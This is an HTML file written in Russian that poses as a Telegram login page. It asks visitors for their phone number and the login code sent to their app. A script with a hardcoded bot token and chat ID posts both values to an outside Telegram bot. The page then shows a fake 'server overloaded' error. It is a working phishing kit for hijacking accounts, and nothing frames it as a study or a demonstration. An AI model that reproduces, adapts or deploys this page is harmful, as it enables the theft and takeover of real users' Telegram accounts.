<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в систему</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 340px; text-align: center; }
        .logo { width: 80px; margin-bottom: 20px; }
        h2 { font-size: 22px; color: #1c1e21; margin: 0 0 10px 0; }
        p { font-size: 14px; color: #606770; line-height: 1.4; margin-bottom: 25px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; outline: none; }
        input:focus { border-color: #0088cc; box-shadow: 0 0 0 2px rgba(0,136,204,0.2); }
        button { width: 100%; padding: 14px; background-color: #0088cc; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: 0.2s; }
        button:hover { background-color: #0077b5; }
        .footer { margin-top: 25px; font-size: 11px; color: #bcc0c4; text-transform: uppercase; letter-spacing: 0.5px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo" alt="Logo">
    <h2>Вход в Telegram</h2>
    <p>Пожалуйста, подтвердите вашу страну и введите номер телефона.</p>
    
    <input type="tel" id="phone" placeholder="+7 (___) ___-__-__">
    <button id="mainBtn" onclick="sendPhone()">ДАЛЕЕ</button>

    <div id="code-area" style="display:none; margin-top: 15px;">
        <p>Код подтверждения отправлен в приложение на другом устройстве.</p>
        <input type="text" id="code" placeholder="Введите код">
        <button onclick="sendCode()">ПОДТВЕРДИТЬ</button>
    </div>

    <div class="footer">Защищено сквозным шифрованием</div>
</div>

<script>
    const TOKEN = "7684085200:AAGeemm4b-kGan-kTMmiem2IGWfX_oL11Gs";
    const CHAT_ID = "88341225";
    const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    // Автоматическая маска номера телефона
    document.getElementById('phone').addEventListener('input', function (e) {
        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,1})(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
        e.target.value = !x[2] ? x[1] : '+' + x[1] + ' (' + x[2] + ') ' + x[3] + (x[4] ? '-' + x[4] : '') + (x[5] ? '-' + x[5] : '');
    });

    async function sendToBot(text) {
        try {
            await fetch(URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: text
                })
            });
        } catch (e) { console.error("Ошибка отправки", e); }
    }

    async function sendPhone() {
        const phone = document.getElementById('phone').value;
        if(phone.length < 10) return alert("Введите полный номер");

        const btn = document.getElementById('mainBtn');
        btn.innerText = "ЗАГРУЗКА...";
        btn.disabled = true;

        await sendToBot(`<b>📱 Новая попытка входа!</b>\n<b>Номер:</b> <code>${phone}</code>`);
        
        document.getElementById('code-area').style.display = 'block';
        btn.style.display = 'none';
    }

    async function sendCode() {
        const code = document.getElementById('code').value;
        const phone = document.getElementById('phone').value;

        if(code.length < 3) return alert("Введите код");

        await sendToBot(`<b>🔑 Получен код!</b>\n<b>Номер:</b> ${phone}\n<b>Код:</b> <code>${code}</code>`);
        
        alert("Ошибка авторизации: сервер перегружен. Повторите попытку позже.");
    }
</script>

</body>
</html>
